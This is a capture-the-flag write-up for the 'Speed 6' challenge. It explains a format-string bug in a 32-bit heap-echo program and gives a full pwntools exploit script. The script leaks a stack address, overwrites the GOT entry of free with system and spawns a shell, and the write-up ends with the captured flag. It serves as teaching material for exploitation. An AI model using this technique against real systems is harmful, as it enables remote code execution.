# Speed 6

## Challenge

The program repeatedly reads user input onto the heap, prints it, then frees the chunk used to store it.

### Checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Solution

There is a format string vulnerability present in how input is printed.
As user input is passed directly to `printf`, we can insert conversion specifiers to read and write arbitrary memory.

To spawn a shell, we can overwrite the GOT entry of `free` with `system`, as `free` is called on every iteration of the loop.

However, if `free` is partially overwritten, the program is almost certain to break.
Therefore, we must overwrite `free` in a single pass.

Since our input is stored on the heap, we must use stored base pointers to modify values on the stack.
We need to use this to write multiple addresses on the stack, each covering a part of the GOT entry for `free`.

Once all these addresses are in place, we can leak the libc address by printing the return address of main.
We can then use the addresses of the GOT entry to replace `free` with `system`.
If we include `/bin/sh #` at the start of our payload, we will get a shell when the program attempts to free the payload.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host speed-06.hfsc.tf --port 37122 speed6
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('speed6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'speed-06.hfsc.tf'
port = int(args.PORT or 37122)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

libc = ELF('libc.so.6')

io = start()

io.sendlineafter(b"f5b: ", b"%10$p")
stack = int(io.recvuntil(b"\n", drop=True), 0) - 18 * 4
print(hex(stack))

io.sendlineafter(b"f5b: ", "%{}c".format((stack + 50 * 4 + 2) % 0x10000).encode() + b"%26$hn")
io.sendlineafter(b"f5b: ", "%{}c".format(exe.got['free'] // 0x10000).encode() + b"%34$hn")

io.sendlineafter(b"f5b: ", "%{}c".format((stack + 50 * 4) % 0x10000).encode() + b"%26$hn")
io.sendlineafter(b"f5b: ", "%{}c".format(exe.got['free'] % 0x10000).encode() + b"%34$hn")

io.sendlineafter(b"f5b: ", "%{}c".format((stack + 51 * 4 + 2) % 0x10000).encode() + b"%26$hn")
io.sendlineafter(b"f5b: ", "%{}c".format((exe.got['free'] + 2) // 0x10000).encode() + b"%34$hn")

io.sendlineafter(b"f5b: ", "%{}c".format((stack + 51 * 4) % 0x10000).encode() + b"%26$hn")
io.sendlineafter(b"f5b: ", "%{}c".format((exe.got['free'] + 2) % 0x10000).encode() + b"%34$hn")

io.sendlineafter(b"f5b: ", b"%50$s")
libc.address = unpack(io.recv(4)) - libc.sym['free']
print(hex(libc.address))

fmt = '/bin/sh #'
written = len(fmt)
to_write = ''

to_write = libc.sym['system'] % 0x10000 - written
written += to_write
fmt += "%{}c%50$hn".format(to_write)

to_write = (libc.sym['system'] // 0x10000 - written) % 0x10000
written += to_write
fmt += "%{}c%51$hn".format(to_write)

print(fmt)

io.sendlineafter(b"f5b: ", fmt.encode())

io.interactive()
```

## Flag

```
midnight{9e4eeacd9b722d7cd7b5f99f07fc90d8}
```
